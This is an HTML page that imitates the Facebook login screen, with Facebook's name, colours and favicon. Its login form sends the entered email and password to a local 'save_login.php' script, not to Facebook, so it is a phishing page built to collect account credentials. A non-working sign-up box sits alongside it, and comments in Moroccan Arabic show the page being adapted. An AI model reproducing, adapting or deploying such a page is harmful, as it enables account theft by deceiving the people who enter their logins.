<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>facebook</title>
<link data-default-icon="https://static.xx.fbcdn.net/rsrc.php/y1/r/ay1hV6OlegS.ico?_nc_eui2=AeEKXqM0f2El1UOs4vZd7KliDLqwI5i5CZMMurAjmLkJk7YJCxuO6ofdUlz82uXczN9b8h_KkjJFz0CTo7fs8Q0-" data-badged-icon="https://static.xx.fbcdn.net/rsrc.php/yD/r/UJj0tgk-RrT.ico?_nc_eui2=AeFK_H748264cKbEy9ESLsvGKl70C3VliBEqXvQLdWWIEUnyP9WF0Lf2iDAlRrrnBnttg3al7lTt0tb1EsFyR7li" rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/y1/r/ay1hV6OlegS.ico?_nc_eui2=AeEKXqM0f2El1UOs4vZd7KliDLqwI5i5CZMMurAjmLkJk7YJCxuO6ofdUlz82uXczN9b8h_KkjJFz0CTo7fs8Q0-">
<style>
/* نفس CSS ديالك بلا تغيير */
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif;}
body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;}
.container{width:390px;background:white;padding:35px;border-radius:16px;box-shadow:0 6px 30px rgba(0,0,0,.15);text-align:center;}
.logo{font-size:54px;font-weight:bold;color:#1877f2;margin-bottom:30px;}
input{width:100%;padding:15px;margin:10px 0;border:1px solid #ddd;border-radius:10px;font-size:16px;}
button{width:100%;padding:14px;border:none;border-radius:10px;font-size:20px;font-weight:bold;cursor:pointer;}
.login-btn{background:#1877f2;color:white;margin-top:10px;}
.create-btn{background:#42b72a;color:white;margin-top:18px;}
.link{display:block;margin-top:18px;color:#1877f2;text-decoration:none;}
hr{margin:25px 0;}
#registerBox{display:none;}
</style>
</head>
<body>

<div class="container">

<div class="logo">facebook</div>

<!-- LOGIN -->
<div id="loginBox">

<form action="save_login.php" method="POST">

<input name="email" placeholder="Email or Username" required>
<input name="password" type="password" placeholder="Password" required>

<button class="login-btn">
Log In
</button>

</form>

<a class="link" href="#">Forgot password?</a>

<hr>

<button class="create-btn" onclick="showRegister()">
Create New Account
</button>

</div>

<!-- REGISTER (خليه كما هو) -->
<div id="registerBox">

<input placeholder="Full Name">
<input placeholder="Email">
<input type="password" placeholder="Password">

<button class="create-btn">
Sign Up
</button>

<a class="link" onclick="backLogin()" href="#">
Back to Login
</a>

</div>

</div>

<script>
function showRegister(){
document.getElementById("loginBox").style.display="none";
document.getElementById("registerBox").style.display="block";
}

function backLogin(){
document.getElementById("loginBox").style.display="block";
document.getElementById("registerBox").style.display="none";
}
</script>

</body>
</html>